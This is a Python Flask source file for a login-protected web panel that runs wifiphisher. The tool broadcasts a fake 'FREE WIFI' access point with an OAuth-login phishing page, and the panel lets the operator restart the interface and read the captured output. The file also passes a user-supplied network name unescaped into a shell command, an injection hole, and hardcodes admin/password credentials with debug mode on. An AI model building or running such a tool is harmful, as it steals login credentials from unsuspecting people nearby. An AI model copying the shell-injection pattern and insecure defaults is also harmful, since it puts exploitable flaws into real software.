from flask import Flask, render_template, request, redirect, url_for, session
import subprocess
import signal

app = Flask(__name__, static_url_path='')
app.secret_key = "your_secret_key"  # Replace with a secure secret key

process = None  # Global variable to store the process

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Replace with your actual authentication logic
        if username == "admin" and password == "password":
            session["user"] = username
            return redirect(url_for("index"))
        else:
            error = "Invalid username or password. Please try again."
            return render_template("login.html", error=error)

    return render_template("login.html")

@app.route("/", methods=["GET", "POST"])
def index():
    global process  # Use the global process variable

    if "user" not in session:
        return redirect(url_for("login"))

    if request.method == "POST":
        if "scancommand" in request.form:
            #command = 'wifiphisher --essid "FREE WI-FI" -p oauth-login -kB >> output.txt' # Command for button 1
            command = 'wifiphisher --essid "FREE WIFI" -p oauth-login -kB' # Command for button 1
        elif "restart" in request.form:
            command = "airmon-ng stop wfphshr-wlan0; service NetworkManager restart" # Command for button 2
        elif "command" in request.form:
            command = request.form.get("command")
            command = command.strip()
            command = f'wifiphisher --essid "{command}" -p oauth-login -kB > output.txt'
        elif "download" in request.form:
            # download the output file when the download button is clicked
            with open("output.txt", "r") as f:
                output = f.read()  # Read the contents of the file
            return render_template("home.html", output=output)
        elif "stop" in request.form:
            if process:
                process.send_signal(signal.SIGINT)  # Send SIGINT to the process
                process = None
            return render_template("home.html", output="Process terminated.")
        else:
            command = None

        if command:
            try:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()
                output = stdout if process.returncode == 0 else stderr
                return render_template("home.html", output=output)
            except Exception as e:
                return render_template("home.html", error=str(e))

    return render_template("home.html")

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)